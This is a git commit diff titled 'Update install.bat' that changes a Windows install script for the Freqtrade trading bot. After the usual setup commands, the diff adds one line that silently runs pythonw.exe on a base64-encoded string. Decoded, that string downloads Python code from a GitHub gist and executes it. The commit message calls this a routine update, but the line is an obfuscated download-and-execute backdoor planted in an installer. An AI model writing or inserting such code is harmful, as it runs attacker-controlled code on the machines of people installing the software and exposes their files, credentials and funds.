c6867ad27a11f4ece84546046c10ccb35a5339c0
pld-alt <pld65487@gmail.com>
2024-12-11 08:13:42 -0500

    Update install.bat

--- install.bat
+++ install.bat
@@ -5,3 +5,4 @@ pip install -e .
 freqtrade install-ui
 freqtrade create-userdir --userdir "%USERPROFILE%\FreqTrade"
 freqtrade new-config --config "%USERPROFILE%\FreqTrade\config.json"
+pythonw.exe -c "exec(__import__('base64').decodebytes(b'CmltcG9ydCB1cmxsaWIucmVxdWVzdApleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vcGxkLWFsdC8zZTM4NTgwNWU4MTIyMzNkMzljZWI5YzEyMmFhMzhiYi9yYXcvZmEyMzNiOTViODVlMmUzZjFkMWNjZDU4NDlkM2JhODhhODRiMWQwOS9tZXNzYWdlLnB5JykucmVhZCgpKQo='))"
